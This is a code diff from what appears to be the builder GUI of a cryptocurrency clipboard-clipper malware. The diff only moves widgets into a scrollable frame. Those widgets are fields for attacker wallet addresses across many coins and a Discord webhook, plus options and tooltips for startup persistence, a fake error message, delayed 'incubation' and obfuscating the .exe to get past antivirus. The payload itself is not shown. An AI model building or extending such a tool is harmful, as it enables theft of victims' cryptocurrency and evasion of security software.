@@ -464,7 +464,7 @@ class buildgui:
             widget.destroy()
 
         customtkinter.CTkLabel(master=option_frame, text="clipper settings").pack(padx=65)
-        customtkinter.CTkLabel(master=main_frame, text="(if address or webhook format isnt correct border will stay same rather than turn green if correct)").pack()
+        customtkinter.CTkLabel(master=main_frame, text="if address or webhook format isnt correct border will stay same rather than turn green if correct").pack()
 
         addr_entry_frame = customtkinter.CTkScrollableFrame(master=main_frame)
         addr_entry_frame.pack(fill="x", padx=5)
@@ -513,35 +513,38 @@ class buildgui:
         
         clipper_type.set("set clipper type")
         clipper_type.pack(fill="x", padx=10, pady=5)
-        single_use_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="single use", onvalue="on", offvalue="off")
-        single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
-        ping_discord_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="@everyone discord", onvalue="on", offvalue="off")
-        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
-        obfuscate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="obfuscated .exe", onvalue="on", offvalue="off")
-        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
-        exe_file_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="normal .exe file", onvalue="on", offvalue="off")
-        exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
 
-        """going to just use global here on"""
-        global incubate_checkbox, false_error_checkbox
-        incubate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="incubate (3 restarts)", onvalue="on", offvalue="off")
-        incubate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
-        false_error_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="false error", onvalue="on", offvalue="off")
-        false_error_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        config_scroll_frame = customtkinter.CTkScrollableFrame(master=option_frame)
+        config_scroll_frame.pack(expand=True, fill="y", padx=5, pady=5)
 
-        add_icon_btn = customtkinter.CTkButton(master=option_frame, text="add custom icon", command=lambda: buildgui.icon_add())
+        add_icon_btn = customtkinter.CTkButton(master=config_scroll_frame, text="add custom icon", command=lambda: buildgui.icon_add())
         add_icon_btn.pack(fill="x", padx=5, pady=0)
 
-        icon_temp_label = customtkinter.CTkLabel(master=option_frame, text="icon will appear here", wraplength=150)
+        icon_temp_label = customtkinter.CTkLabel(master=config_scroll_frame, text="icon will appear here", wraplength=150)
         icon_temp_label.pack(pady=(0, 5))
 
-        set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
+        set_config_btn = customtkinter.CTkButton(master=config_scroll_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, 
                                                                                                                                                                                 btc_addr, eth_addr, xmr_addr, bch_addr,
                                                                                                                                                                                 ltc_addr, sol_addr, doge_addr,
                                                                                                                                                                                 xrp_addr, trx_addr, webhook_url))
         set_config_btn.pack(fill="x", padx=10, pady=0)
-        config_set_lbl = customtkinter.CTkLabel(master=option_frame, text="config not set", text_color="red")
+        config_set_lbl = customtkinter.CTkLabel(master=config_scroll_frame, text="config not set", text_color="red")
         config_set_lbl.pack()
+        single_use_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="single use", onvalue="on", offvalue="off")
+        single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        ping_discord_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="@everyone discord", onvalue="on", offvalue="off")
+        ping_discord_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+        obfuscate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="obfuscated .exe", onvalue="on", offvalue="off")
+        obfuscate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        exe_file_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="normal .exe file", onvalue="on", offvalue="off")
+        exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
+
+        """going to just use global here on"""
+        global incubate_checkbox, false_error_checkbox
+        incubate_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="incubate (3 restarts)", onvalue="on", offvalue="off")
+        incubate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        false_error_checkbox = customtkinter.CTkCheckBox(master=config_scroll_frame, text="false error", onvalue="on", offvalue="off")
+        false_error_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
 
         CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", wraplength=300)
         CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", wraplength=300)
